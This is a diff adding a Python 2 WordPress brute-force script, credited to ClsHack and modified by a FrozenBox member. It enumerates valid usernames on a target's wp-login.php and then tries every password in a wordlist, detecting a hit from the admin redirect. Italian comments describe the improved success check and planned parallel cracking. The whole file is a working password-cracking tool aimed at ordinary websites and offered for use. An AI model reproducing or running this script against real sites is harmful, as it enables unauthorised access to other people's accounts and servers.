@@ -1,0 +1,127 @@
+# -*- coding: utf-8 -*-
+import urllib
+import subprocess
+
+#print socket.getdefaulttimeout()
+#socket.setdefaulttimeout(0.6)
+#print socket.getdefaulttimeout()
+def main():
+#============INPUT
+   username = raw_input("Insert username:\n\t>")
+   host = raw_input("Insert host:\n\t>").lower().replace("http://","")
+   host="http://"+host
+   filepwd= raw_input("dictionary file location:\n\t>")
+#============FUNZIONI
+   def check(host,username,filepwd):
+      file = open(filepwd)
+      lineC=0
+      while 1:
+         true=1
+         line = file.readline()
+         if not line:
+            break #stop :D
+         
+         password=""+line+"".lower().replace("\n","")
+         print "Try:"+(password+":"+username).replace("\n","")
+         #log   clshack
+         #pwd   password
+         #redirect_to   http://www.clshack.it/wp-admin/
+         #testcookie   1
+         #wp-submit   Log In
+         #
+         #
+         try:
+            f=urllib.urlopen(host+"/wp-login.php", "log="+username+"&pwd="+password)
+         except IOError, e:
+            print "Error, with connection "
+            exit()
+         else:
+            dati=f.read()
+            print"\n==================================\nSend:"+host+"/wp-login.php log="+username+"&pwd="+password
+            if (dati.find("Incorrect password")>0):
+               print f.geturl()
+               true=0
+            if(dati.find("password non corretta")>0):
+               print f.geturl()
+               true=0
+            if f.geturl() == host+"/wp-login.php?redirect_to="+host.replace("/", "%2F").replace(":", "%3A")+"%2Fwp-admin%2F&reauth=1":
+               print f.geturl()
+               print "Password found:"+password+" Line:"+str(lineC+1)+"\n"
+               break
+               
+            print f.geturl()
+         
+            #print dati
+         lineC=lineC+1
+      file.close()
+      f.close()
+      
+      
+   #check if is a wordpress blog and a valid username.    
+   def wordpress(host,username):
+      try:
+         f=urllib.urlopen(host+"/wp-login.php")
+      except IOError, e:
+         print "Error, with connection "
+         exit()
+      else:
+         
+         if (f.getcode()==404):
+            print "Error, ins't wordpress blog."
+            return 0
+         else:
+            f.close()
+            f=urllib.urlopen(host+"/wp-login.php", "log="+username+"&pwd=clshack")
+            dati=f.read()
+            if( dati.find("nome utente non valido")>0 ):
+               print username+" user not found in woprdpress blog."
+               return 0
+            if( dati.find("Invalid username")>0 ):
+               print username+" user not found in woprdpress blog."
+               return 0
+      return 1
+   
+   if (wordpress(host,username)==1):
+      check(host,username,filepwd)
+   
+   
+   
+   
+#banner
+subprocess.Popen([r"clear"]).wait()
+print   "*-----------------------------------------------*\n" 
+print   "*           ClsHack Wordpress Brute             *\n"
+print   "*           http://www.clshack.it               *\n"
+print   "*                                               *\n"
+print   "*************************************************\n"
+print   "*                                               *\n"
+print   "*      optimized & modified by EclipseSpark     *\n"
+print   "*             from FrozenBox network            *\n"
+print   "*                                               *\n"
+print   "*          http://www.frozenbox.org             *\n"
+print   "*         http://blog.frozenbox.org             *\n"
+print   "*        http://eclipse.frozenbox.org           *\n"
+print   "*-----------------------------------------------*\n"
+
+
+# nella vecchia versione del software il sistema di validazione
+# delle passwords in caso di password corretta non funzionava affatto
+# in quanto veniva impostata una variabile uguale ad 1, se all'interno della pagina di login
+# venivano trovate stringhe come "invalid password" ecc allora quella variabile cambiava a 0
+# ma il metodo non funzionava per via dell'uso massiccio di javascript,
+# cosÃ¬ mi sono basato sulle mie conoscenze di wordpress evolvendo un'altro sistema di verifica:
+#
+# quando la password Ã¨ errata, verrÃ  ricaricata la pagina di login, ma se la password Ã¨ corretta
+# verrÃ  richiesta la pagina di login con un'aggiunta, viene richiamata anche la variabile di
+# redirect nell'url che richiede il caricamento della pagina di amministrazione.
+# cosÃ¬ al posto di cercare all'interno della pagina alla ricerca della *non presenza* di messaggi
+# di errore (metodo che non funzionava), ora lo script cerca se l'url Ã¨ quello di login o se
+# vi Ã¨ l'aggiunta di una richiesta di redirect al pannello ammministrazione, richiesta che
+# viene inviata dal server solo se la password Ã¨ corretta.
+#
+# prossimamente aggiungerÃ² un sistema che permetterÃ  di avviare piu processi di cracking contemporaneamente
+# cosÃ¬ da aumentare esponenzialmente il numero di tentativi simultanei effettuati
+
+
+#url
+main()
